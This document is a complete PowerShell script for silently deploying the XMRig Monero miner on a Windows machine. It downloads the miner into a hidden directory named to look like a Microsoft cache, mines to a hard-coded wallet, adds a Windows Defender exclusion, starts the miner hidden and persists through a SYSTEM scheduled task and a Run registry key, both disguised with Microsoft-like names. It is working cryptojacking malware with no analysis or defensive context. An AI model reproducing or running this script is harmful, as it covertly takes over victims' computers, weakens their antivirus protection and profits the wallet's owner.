# XMRig Silent Deploy FINAL v11 - NO BOM + log visible + BAT wrapper
$InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    (Get-Item $InstallDir).Attributes += "Hidden"
}

# Limpieza de archivos antiguos por si acaso
Remove-Item "$InstallDir\config.json" -Force -ErrorAction SilentlyContinue
Remove-Item "$InstallDir\start.bat" -Force -ErrorAction SilentlyContinue

# Descarga y extracción
$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$ZipPath = "$env:TEMP\xmrig-final.zip"
Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60
Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue

$Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
if ($Sub) {
    Move-Item "$($Sub.FullName)\*" $InstallDir -Force
    Remove-Item $Sub.FullName -Recurse -Force
}

$ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1).FullName
$ConfigPath = "$InstallDir\config.json"
$BatPath = "$InstallDir\start.bat"

# Config SIN BOM (usamos ASCII) + log para depurar
$ConfigJson = @"
{
  "autosave": false,
  "colors": false,
  "cpu": { "enabled": true, "max-threads-hint": 60 },
  "donate-level": 0,
  "log-file": "xmr.log",
  "pools": [{
    "algo": "rx/0",
    "url": "pool.supportxmr.com:443",
    "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
    "pass": "x",
    "keepalive": true,
    "tls": true,
    "rig-id": "$env:COMPUTERNAME"
  }],
  "print-time": 60
}
"@
$ConfigJson | Out-File $ConfigPath -Encoding ascii -Force

# BAT wrapper (más estable)
"@echo off
cd /d `"$InstallDir`"
start /B xmrig.exe -c config.json -B --no-color" | Out-File $BatPath -Encoding ASCII -Force

# Excluir del Defender
try { Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue } catch {}

# Arrancar ya
Start-Process -FilePath $BatPath -WindowStyle Hidden

# Persistencia SYSTEM
$TaskName = "MicrosoftNetworkCache"
$Action  = New-ScheduledTaskAction -Execute $BatPath
$Trigger = New-ScheduledTaskTrigger -AtStartup
try {
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
} catch {
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
}

# Fallback Registry
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "`"$BatPath`"" -Force
